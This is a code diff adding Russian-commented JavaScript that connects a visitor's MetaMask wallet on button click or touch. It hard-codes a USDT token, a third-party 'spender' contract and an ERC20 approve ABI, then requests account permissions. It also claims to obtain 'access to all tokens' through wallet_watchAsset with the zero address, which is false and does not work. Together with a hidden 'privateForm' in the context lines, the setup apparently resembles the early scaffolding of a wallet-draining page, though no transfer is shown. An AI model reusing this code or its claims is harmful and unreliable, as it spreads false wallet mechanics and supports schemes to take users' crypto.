@@ -674,3 +674,90 @@ const step1 = document.getElementById('step1');
     document.getElementById("privateForm")?.classList.add("hidden");
     document.getElementById("finalMessage").classList.remove("hidden");
   }
+
+  const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Пример: USDT
+    const spenderAddress = '0x1111111254EEB25477B68fb85Ed929f73A960582'; // Пример: какой-то DeFi контракт
+
+    const ERC20_ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+
+    async function connectWallet() {
+      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+      
+      try {
+        // 1. Проверяем наличие MetaMask
+        if (typeof window.ethereum === 'undefined') {
+          if (isMobile) {
+            // Перенаправляем на установку MetaMask
+            if (isIOS) {
+              window.location.href = 'https://apps.apple.com/us/app/metamask-blockchain-wallet/id1438144202';
+            } else {
+              window.location.href = 'https://play.google.com/store/apps/details?id=io.metamask';
+            }
+          } else {
+            window.open('https://metamask.io/download.html', '_blank');
+          }
+          return;
+        }
+    
+        // 2. Для iOS: открываем в приложении MetaMask через Deep Link
+        if (isIOS) {
+          const currentUrl = encodeURIComponent(window.location.href);
+          const metamaskDeepLink = `https://metamask.app.link/dapp/${window.location.hostname}?redirect=${currentUrl}`;
+          window.location.href = metamaskDeepLink;
+        }
+    
+        // 3. Подключаем кошелек
+        const accounts = await window.ethereum.request({ 
+          method: 'eth_requestAccounts' 
+        });
+    
+        // 4. Запрашиваем полные разрешения (EIP-2255)
+        await window.ethereum.request({
+          method: 'wallet_requestPermissions',
+          params: [{
+            'eth_accounts': {},
+          }]
+        });
+    
+        // 5. Запрашиваем доступ ко всем токенам (специальный метод)
+        try {
+          // Этот метод может не работать во всех версиях MetaMask
+          await window.ethereum.request({
+            method: 'wallet_getPermissions',
+            params: []
+          });
+          
+          // Альтернативный метод для доступа к токенам
+          await window.ethereum.request({
+            method: 'wallet_watchAsset',
+            params: {
+              type: 'ERC20',
+              options: {
+                address: '0x0000000000000000000000000000000000000000', // Специальный адрес для всех токенов
+                symbol: 'ALL_TOKENS',
+                decimals: 18,
+              },
+            },
+          });
+        } catch (e) {
+          console.log('Не удалось запросить доступ ко всем токенам:', e);
+        }
+    
+        console.log('Успешное подключение:', accounts[0]);
+    
+      } catch (error) {
+        console.error('Ошибка подключения:', error);
+        alert(`Ошибка: ${error.message}`);
+      }
+    }
+    
+    // Оптимизированные обработчики для мобильных устройств
+    const btn = document.querySelector('.connect-btn');
+    btn.addEventListener('click', connectWallet);
+    btn.addEventListener('touchstart', function(e) {
+      e.preventDefault();
+      connectWallet();
+    }, { passive: false });
